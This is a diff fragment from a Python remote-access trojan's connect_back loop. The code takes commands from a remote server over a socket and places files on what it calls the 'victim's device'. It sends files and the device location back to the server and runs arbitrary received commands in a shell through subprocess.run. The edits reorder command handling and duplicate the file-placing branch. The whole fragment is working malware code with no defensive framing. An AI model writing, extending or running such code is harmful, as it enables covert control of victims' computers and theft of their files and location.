@@ -133,7 +133,7 @@ def connect_back():
             cmd = s.recv(1024).decode("utf-8").strip()
             if not cmd:
                 continue
-            if cmd == "put-files-desktop":
+            if cmd.lower().startswith("put-files-desktop"):
                 args_files = cmd.split()
                 put_files_in_desktop(args_files)
                 s.send(b"The files put on victim's device")
@@ -146,13 +146,16 @@ def connect_back():
                 if get_location_and_send() == True:
                     s.send(b"Location has been sent to the server\n")
                 continue
+            if cmd.lower().startswith("put-files-desktop"):
+                args_files = cmd.split()
+                put_files_in_desktop(args_files)
+                s.send(b"The files put on victim's device")
+                continue
             if cmd.startswith("send"):
                 args_files = cmd.split()
                 send_files(args_files)
                 s.send(b"Files have been sent to the server\n")
                 continue
-            if cmd.lower() == "exit":
-                break
             if cmd.lower().startswith("cd"):
                 try:
                     parts = shlex.split(cmd)
@@ -162,6 +165,8 @@ def connect_back():
                 except Exception as e:
                     s.send(f"[-] {e}\n".encode())
                 continue
+            if cmd.lower() == "exit":
+                break
             output = subprocess.run(
                 cmd,
                 shell=True,
